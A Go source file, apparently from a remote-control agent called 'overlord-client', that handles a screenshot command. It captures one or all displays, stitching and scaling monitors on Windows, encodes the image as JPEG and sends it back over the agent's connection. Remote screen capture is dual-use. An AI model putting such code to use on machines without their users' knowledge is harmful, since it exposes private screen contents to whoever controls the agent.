package handlers

import (
	"bytes"
	"context"
	"errors"
	"image"
	"image/draw"
	"image/jpeg"
	"log"
	goruntime "runtime"

	"overlord-client/cmd/agent/capture"
	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"

	"github.com/kbinani/screenshot"
)

var (
	monitorCountFn             = capture.MonitorCount
	displayBoundsFn            = capture.DisplayBounds
	captureDisplayRGBABitBltFn = capture.CaptureDisplayRGBABitBlt
)

func HandleScreenshot(ctx context.Context, env *rt.Env, cmdID string, allDisplays bool) error {
	restore := capture.BypassResolutionCap()
	defer restore()

	if allDisplays {
		log.Printf("screenshot: capturing all displays")
	} else {
		log.Printf("screenshot: capturing primary display")
	}

	defer func() {
		if r := recover(); r != nil {
			log.Printf("screenshot: panic recovered: %v", r)
			wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
				Type:      "command_result",
				CommandID: cmdID,
				OK:        false,
				Message:   "screenshot capture panicked",
			})
		}
	}()

	img, displayIndex, bounds, err := captureScreenshotImage(allDisplays)
	if err != nil {
		log.Printf("screenshot: capture failed: %v", err)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		})
	}

	var buf bytes.Buffer
	opts := &jpeg.Options{Quality: 85}
	if err := jpeg.Encode(&buf, img, opts); err != nil {
		log.Printf("screenshot: jpeg encode failed: %v", err)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		})
	}

	jpegData := buf.Bytes()
	log.Printf("screenshot: captured %dx%d, encoded %d bytes", bounds.Dx(), bounds.Dy(), len(jpegData))

	screenshotResult := wire.ScreenshotResult{
		Type:      "screenshot_result",
		CommandID: cmdID,
		Format:    "jpeg",
		Width:     bounds.Dx(),
		Height:    bounds.Dy(),
		Data:      jpegData,
	}

	if err := wire.WriteMsg(ctx, env.Conn, screenshotResult); err != nil {
		log.Printf("screenshot: failed to send screenshot result: %v", err)
		return err
	}

	frame := wire.Frame{
		Type: "frame",
		Header: wire.FrameHeader{
			Monitor: displayIndex,
			FPS:     0,
			Format:  "jpeg",
		},
		Data: jpegData,
	}

	if err := wire.WriteMsg(ctx, env.Conn, frame); err != nil {
		log.Printf("screenshot: failed to send frame: %v", err)
		return err
	}

	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        true,
	})
}

func captureScreenshotImage(allDisplays bool) (*image.RGBA, int, image.Rectangle, error) {
	if goruntime.GOOS == "windows" {
		if img, displayIndex, bounds, err := captureScreenshotImageWindows(allDisplays); err == nil && img != nil {
			return img, displayIndex, bounds, nil
		}
	}

	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return nil, 0, image.Rectangle{}, errors.New("no active displays available")
	}

	displayIndex := 0
	if allDisplays {
		minX := int(1e9)
		minY := int(1e9)
		maxX := int(-1e9)
		maxY := int(-1e9)

		for i := 0; i < n; i++ {
			b := screenshot.GetDisplayBounds(i)
			if b.Min.X < minX {
				minX = b.Min.X
			}
			if b.Min.Y < minY {
				minY = b.Min.Y
			}
			if b.Max.X > maxX {
				maxX = b.Max.X
			}
			if b.Max.Y > maxY {
				maxY = b.Max.Y
			}
		}

		bounds := image.Rect(minX, minY, maxX, maxY)
		img, err := screenshot.CaptureRect(bounds)
		return img, displayIndex, bounds, err
	}

	minX := int(1e9)
	minY := int(1e9)
	for i := 0; i < n; i++ {
		b := screenshot.GetDisplayBounds(i)
		if b.Min.X <= minX && b.Min.Y <= minY {
			minX = b.Min.X
			minY = b.Min.Y
			displayIndex = i
		}
	}
	bounds := screenshot.GetDisplayBounds(displayIndex)
	img, err := screenshot.CaptureRect(bounds)
	return img, displayIndex, bounds, err
}

func captureScreenshotImageWindows(allDisplays bool) (*image.RGBA, int, image.Rectangle, error) {
	monitorCount := monitorCountFn()
	if monitorCount <= 0 {
		return nil, 0, image.Rectangle{}, errors.New("no active displays available")
	}

	if !allDisplays {
		img, err := captureDisplayRGBABitBltFn(0)
		if err != nil || img == nil {
			return nil, 0, image.Rectangle{}, err
		}
		return img, 0, img.Rect, nil
	}

	type monCapture struct {
		bounds image.Rectangle
		img    *image.RGBA
	}
	parts := make([]monCapture, 0, monitorCount)
	minX, minY := int(1e9), int(1e9)
	maxX, maxY := int(-1e9), int(-1e9)

	for i := 0; i < monitorCount; i++ {
		bounds := displayBoundsFn(i)
		img, err := captureDisplayRGBABitBltFn(i)
		if err != nil || img == nil {
			return nil, 0, image.Rectangle{}, err
		}
		parts = append(parts, monCapture{bounds: bounds, img: img})
		if bounds.Min.X < minX {
			minX = bounds.Min.X
		}
		if bounds.Min.Y < minY {
			minY = bounds.Min.Y
		}
		if bounds.Max.X > maxX {
			maxX = bounds.Max.X
		}
		if bounds.Max.Y > maxY {
			maxY = bounds.Max.Y
		}
	}

	type scaledPart struct {
		img  *image.RGBA
		offX int
		offY int
	}
	sp := make([]scaledPart, len(parts))
	for i, part := range parts {
		sx, sy := 1.0, 1.0
		if bw := part.bounds.Dx(); bw > 0 {
			sx = float64(part.img.Rect.Dx()) / float64(bw)
		}
		if bh := part.bounds.Dy(); bh > 0 {
			sy = float64(part.img.Rect.Dy()) / float64(bh)
		}
		sp[i] = scaledPart{
			img:  part.img,
			offX: int(float64(part.bounds.Min.X-minX) * sx),
			offY: int(float64(part.bounds.Min.Y-minY) * sy),
		}
	}

	cW, cH := 0, 0
	for _, s := range sp {
		if rx := s.offX + s.img.Rect.Dx(); rx > cW {
			cW = rx
		}
		if ry := s.offY + s.img.Rect.Dy(); ry > cH {
			cH = ry
		}
	}

	canvas := image.NewRGBA(image.Rect(0, 0, cW, cH))
	for _, s := range sp {
		dst := image.Rect(s.offX, s.offY, s.offX+s.img.Rect.Dx(), s.offY+s.img.Rect.Dy())
		draw.Draw(canvas, dst, s.img, s.img.Rect.Min, draw.Src)
	}

	return canvas, 0, canvas.Rect, nil
}
